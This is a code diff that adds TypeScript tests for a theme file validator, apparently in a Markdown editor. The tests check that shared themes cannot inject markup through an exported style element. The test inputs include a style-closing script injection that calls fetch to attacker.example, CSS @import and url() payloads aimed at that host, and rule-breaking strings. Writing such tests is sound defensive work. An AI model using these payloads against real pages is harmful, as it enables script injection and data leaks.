@@ -278,3 +278,61 @@ describe("the two token namespaces stay apart", () => {
     }
   });
 });
+
+describe("theme values as CSS", () => {
+  /**
+   * A theme is a file people share, so it is untrusted input. `applyTheme` is safe
+   * on its own — `setProperty` goes through CSSOM — but the HTML exporter writes the
+   * same tokens as *text* into a literal `<style>`, which is a raw-text element: the
+   * tokenizer ends it at the first `</style`.
+   */
+  const hostile = "#fff</style><script>fetch('https://attacker.example')</script>";
+
+  function withColor(value: string) {
+    const base = structuredClone(house.light);
+    base.colors.bg = value;
+    return base;
+  }
+
+  it("refuses a colour that closes the style element", () => {
+    const result = ThemeSchema.safeParse(withColor(hostile));
+    expect(result.success).toBe(false);
+  });
+
+  it.each([
+    ["a semicolon, ending the declaration", "#fff; background: red"],
+    ["braces, closing the rule", "#fff} body { display: none"],
+    ["an at-rule", "@import 'https://attacker.example/x.css'"],
+    ["url(), which also fetches", "url(https://attacker.example/pixel.png)"],
+    ["a comment, swallowing what follows", "#fff /* "],
+  ])("refuses %s", (_label, value) => {
+    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(false);
+  });
+
+  it.each([
+    ["oklch, how the presets are authored", "oklch(0.72 0.11 253)"],
+    ["hex", "#a3b1c6"],
+    ["rgb with commas", "rgb(163, 177, 198)"],
+    ["a var() reference", "var(--doc-accent)"],
+    ["a colour keyword", "rebeccapurple"],
+  ])("still accepts %s", (_label, value) => {
+    expect(ThemeSchema.safeParse(withColor(value)).success).toBe(true);
+  });
+
+  it("still accepts a real font stack, quotes and commas and all", () => {
+    const theme = structuredClone(house.light);
+    theme.typography.bodyFont = '"IBM Plex Sans", -apple-system, Segoe UI, sans-serif';
+    expect(ThemeSchema.safeParse(theme).success).toBe(true);
+  });
+
+  it("refuses a font family that closes the style element", () => {
+    const theme = structuredClone(house.light);
+    theme.typography.bodyFont = hostile;
+    expect(ThemeSchema.safeParse(theme).success).toBe(false);
+  });
+
+  it("rejects the hostile theme as a whole theme file, which is how it would arrive", () => {
+    const file = { format: "lindo-md-theme", version: 1, theme: withColor(hostile) };
+    expect(ThemeFileSchema.safeParse(file).success).toBe(false);
+  });
+});
